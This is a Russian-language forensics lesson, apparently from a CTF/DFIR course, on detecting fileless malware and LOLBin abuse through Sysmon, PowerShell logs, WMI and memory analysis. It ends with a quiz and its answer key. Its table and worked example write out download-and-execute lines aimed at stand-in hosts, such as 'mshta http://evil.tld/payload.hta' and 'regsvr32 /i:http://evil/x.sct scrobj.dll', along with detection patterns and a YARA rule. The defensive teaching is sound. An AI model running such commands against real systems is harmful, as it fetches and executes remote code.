---
id: forensics-fileless
title: "Fileless-малварь и LOLBins: обнаружение"
category: forensics
parent: forensics-malware-yara
difficulty: hard
order: 1
tags: [fileless, lolbin, powershell, wmi, registry, malware, dfir]
prerequisites: [forensics-malware-yara, forensics-powershell-logs]
useful_for:
  - "CTF Forensics категория"
  - "DFIR / Incident Response"
  - "Threat Hunting / SOC"
estimated_minutes: 45
summary: "Fileless-атаки: LOLBins, PowerShell-пейлоады, WMI/реестр-персистентность, in-memory выполнение — и какие артефакты остаются после них."
---
Fileless-малварь не оставляет исполняемого файла на диске: код живёт в памяти, в реестре, в WMI-подписках или исполняется через легитимные системные утилиты (LOLBins). Обнаружить её сложнее, но артефакты всё же остаются — в журналах, реестре, WMI и оперативной памяти. Этот урок — про техники fileless-атак и следы, которые они оставляют.

## Что такое fileless

Fileless-атака использует существующие легитимные компоненты ОС для выполнения кода:

- **LOLBins** (Living Off the Land Binaries) — `powershell.exe`, `mshta.exe`, `rundll32.exe`, `regsvr32.exe`, `certutil.exe`, `wmic.exe`, `msbuild.exe`, `bitsadmin.exe`.
- **Скрипты в памяти** — PowerShell `-enc` (base64), `IEX (New-Object Net.WebClient).DownloadString(...)`.
- **WMI-подписки** — постоянные потребители (см. `forensics-wmi`).
- **Реестр** — payload в значении ключа, исполняемый скриптом/планировщиком.
- **Отражённая загрузка** — reflective DLL в память без файла.

Общая черта: **нет файла-малвари на диске**, но есть необычная активность легитимных бинарей.

## LOLBins и их артефакты

| LOLBin | Типичное злоупотребление | Артефакт |
|--------|--------------------------|----------|
| `powershell.exe` | `-enc`, `DownloadString` | PS 4103/4104, Sysmon 1 |
| `mshta.exe` | `mshta http://evil/x.hta` | Sysmon 1, сетевое соединение |
| `rundll32.exe` | `javascript:` / DLL-экспорт | Sysmon 1, 7 |
| `regsvr32.exe` | `/i:http://evil/x.sct scrobj.dll` | Sysmon 1, сеть |
| `certutil.exe` | `-urlcache -f http://evil/x` | Sysmon 1, файл |
| `wmic.exe` | `process call create`, XSL | Sysmon 1, WMI-активность |
| `msbuild.exe` | inline task C# | Sysmon 1, сборка |
| `bitsadmin.exe` | `/transfer` загрузка | Sysmon 1, BITS-лог |

```bash
# подозрительные командные строки LOLBins
$ evtx_dump -o json Sysmon.evtx | jq -r 'select(.Event.System.EventID==1) | .Event.EventData.CommandLine' | grep -iE 'powershell.*-enc|mshta http|regsvr32.*scrobj|certutil.*urlcache'
```

## PowerShell-артефакты

PowerShell — главный инструмент fileless. Ключевые журналы: `Microsoft-Windows-PowerShell/Operational` (4103 Module Logging, 4104 Script Block Logging) и `Windows PowerShell` (400/600 — запуск/старт).

```bash
# содержимое скрипт-блоков
$ evtx_dump -o json 'PowerShell%4Operational.evtx' | jq -r 'select(.Event.System.EventID==4104) | .Event.EventData.ScriptBlockText' > blocks.txt
# признаки обфускации/загрузки
$ grep -iE 'FromBase64String|IEX|Invoke-Expression|DownloadString|WebClient|-enc ' blocks.txt | head
# декодировать base64-команду
$ echo 'SQBFAFgA...' | base64 -d | iconv -f UTF-16LE -t UTF-8
```

Если 4104 выключен, остаются косвенные следы: модульный лог, `ConsoleHost_history.txt` (`%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`).

```bash
$ cat ConsoleHost_history.txt | grep -iE 'download|iex|base64' | head
```

## Закрепление без файлов

- **WMI-подписки**: `__EventFilter` + `CommandLineEventConsumer` (см. `forensics-wmi`).
- **Реестр**: `Run`/`RunOnce`, `Image File Execution Options` (debugger), `AppInit_DLLs`, `Winlogon` `Userinit`.
- **Планировщик задач**: задача, запускающая `powershell -enc` без файла на диске.
- **Scheduled Task с COM-обработчиком**: запуск скрипта в контексте системы.

```bash
$ evtx_dump -o json 'TaskScheduler%4Operational.evtx' | jq -r 'select(.Event.System.EventID==106 or .Event.System.EventID==200) | .Event.EventData' | grep -i powershell
$ rip.pl -r NTUSER.DAT -p run | grep -i powershell
```

## Артефакты в памяти

Fileless-код живёт в памяти — его находят Volatility/YARA.

```bash
# подозрительные регионы памяти
$ vol -f mem.raw windows.malfind
# YARA по памяти (искать скрипты/шеллкод)
$ vol -f mem.raw windows.yarascan --yara-file=fileless.yar
# командные строки процессов
$ vol -f mem.raw windows.cmdline | grep -iE 'powershell|mshta|rundll32'
```

```yara
rule Fileless_PS {
    strings:
        $a = "FromBase64String" ascii wide
        $b = "DownloadString" ascii wide
        $c = "Invoke-Expression" ascii wide
    condition:
        any of them
}
```

## Разобранный пример

Подозрение на fileless-атаку через `mshta`.

```bash
# 1. Процесс mshta с URL
$ evtx_dump -o json Sysmon.evtx | jq -r 'select(.Event.System.EventID==1 and (.Event.EventData.Image|test("mshta"))) | .Event.EventData.CommandLine'
mshta http://evil.tld/payload.hta
# 2. Сетевое соединение
$ evtx_dump -o json Sysmon.evtx | jq 'select(.Event.System.EventID==3 and (.Event.EventData.Image|test("mshta")))'
# 3. Родитель (Word/Excel -> mshta = макрос)
$ evtx_dump -o json Sysmon.evtx | jq -r 'select(.Event.System.EventID==1 and (.Event.EventData.Image|test("mshta"))) | .Event.EventData.ParentImage'
winword.exe
# 4. Что скачал
$ evtx_dump -o json Sysmon.evtx | jq -r 'select(.Event.System.EventID==22) | .Event.EventData.QueryName' | grep -i evil
# 5. Память
$ vol -f mem.raw windows.cmdline | grep -i mshta
```

## Справочная таблица

| Техника | Артефакт |
|---------|----------|
| PowerShell `-enc` | PS 4104, Sysmon 1 |
| `mshta` URL | Sysmon 1/3/22 |
| `regsvr32` scrobj | Sysmon 1/3 |
| WMI-подписка | OBJECTS.DATA, 5861 |
| Реестр-payload | Run, IFEO |
| Reflective DLL | malfind, VAD |
| Scheduled Task | TaskScheduler EVTX |

## Частые ошибки

- **Искать файл-малварь** — fileless её не имеет.
- **Игнорировать PS-логи** — там видно содержимое скриптов.
- **Верить, что «легитимный бинарь» = безопасно** — LOLBins злоупотребляют.
- **Не включать аудит** — 4104/4688 могут быть выключены (проверьте).
- **Забывать про память** — fileless живёт там.
- **Не коррелировать родителя** — Word→mshta/powershell = макрос.

## Краткое резюме

Fileless-атаки не оставляют файла-малвари на диске, но всегда оставляют следы в журналах и памяти. Ключевые источники: Sysmon (1/3/8/10/22), PowerShell 4103/4104, WMI-Activity (5861), TaskScheduler, реестр и дамп памяти. Главный принцип обнаружения — корреляция: аномальный LOLBin (`mshta`, `powershell -enc`, `regsvr32`) + необычный родитель + сетевое соединение + закрепление. Для надёжного детекта заранее включите аудит командной строки, Script Block Logging и Sysmon с правильным конфигом.

## Что дальше / решение

Конвейер: Sysmon/4688 (LOLBins) → PS 4104 (скрипты) → WMI/реестр (закрепление) → память (malfind/YARA). Связка: `forensics-wmi` (WMI), `forensics-powershell-logs` (PS), `forensics-malware-yara` (YARA), `forensics-memory-injection` (инъекции).

## Обнаружение через аудит и SIEM

Чтобы ловить fileless, нужен правильный аудит:

- **4688** с `ProcessCommandLine` (включить «Include command line in process creation events»).
- **Sysmon** с конфигом, логирующим процессы (1), сеть (3), образы (7), CreateRemoteThread (8), доступ к процессам (10), DNS (22).
- **PowerShell Script Block Logging** (4104) и **Module Logging** (4103).
- **WMI-Activity** (5857/5860/5861).
- **TaskScheduler** (106/200/201).

```bash
# включить аудит командной строки (Windows)
$ auditpol /set /subcategory:"Process Creation" /success:enable
$ reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1
```

Sigma-правила для LOLBins (`mshta`, `regsvr32 scrobj`, `certutil -urlcache`, `powershell -enc`) применяйте через `Chainsaw`/`Hayabusa`.

## Сложные случаи

- **Скрипт-блоки усечены** — 4104 может быть разбит на несколько событий; склеивайте по `MessageNumber`/`MessageTotal`.
- **Base64 в UTF-16LE** — декодируйте с `iconv -f UTF-16LE`.
- **Отсутствие 4104** — проверьте, включено ли Script Block Logging.
- **mshta/rundll32 с `javascript:`** — код целиком в аргументе; сохраните командную строку.
- **AMSI-обход** — малварь может обходить AMSI; полагайтесь на поведенческие артефакты, а не только на сигнатуры.
- **Memory-only** — если нет дампа, восстановить payload сложно; фиксируйте хотя бы сеть и родителя.

```bash
# декодировать PowerShell -enc
$ echo '<base64>' | base64 -d | iconv -f UTF-16LE -t UTF-8
# склеить разбитый 4104
$ evtx_dump -o json PS.evtx | jq -r 'select(.Event.System.EventID==4104) | [.Event.EventData.MessageNumber, .Event.EventData.ScriptBlockText] | @tsv' | sort | head
```

## Квиз

```quiz
- question: "Что такое LOLBin?"
  options:
    - "вредоносный файл на диске"
    - "легитимная системная утилита, используемая во вредоносных целях"
    - "тип шифрования"
    - "журнал событий"
  answer: 1
- question: "Какой Sysmon EventID указывает на CreateRemoteThread (инъекцию)?"
  options:
    - "1"
    - "3"
    - "8"
    - "11"
  answer: 2
- question: "Где может храниться fileless-персистентность?"
  options:
    - "только на флешке"
    - "в реестре, WMI-подписках, задачах планировщика"
    - "только в EVTX"
    - "в prefetch"
  answer: 1
- question: "Что показывает PowerShell EventID 4104?"
  options:
    - "сетевые соединения"
    - "тело исполняемого скрипта (после декодирования)"
    - "дамп памяти"
    - "установку службы"
  answer: 1
- question: "Почему при fileless-атаке важно снять дамп памяти?"
  options:
    - "чтобы сохранить in-memory артефакты до перезагрузки"
    - "чтобы расшифровать диск"
    - "чтобы получить EVTX"
    - "чтобы сбросить пароль"
  answer: 0
```

## Где пригодится

- **CTF:** задачи на поиск безфайловых атак по логам/памяти.
- **DFIR:** обнаружение и атрибуция LOLBin-активности.
- **Threat Hunting:** охота на подозрительные цепочки процессов и командные строки.
- **SOC:** правила Sigma на 4104/Sysmon 1/8/10.
- **Пентест (red team awareness):** понимание, какие следы оставляет техника.
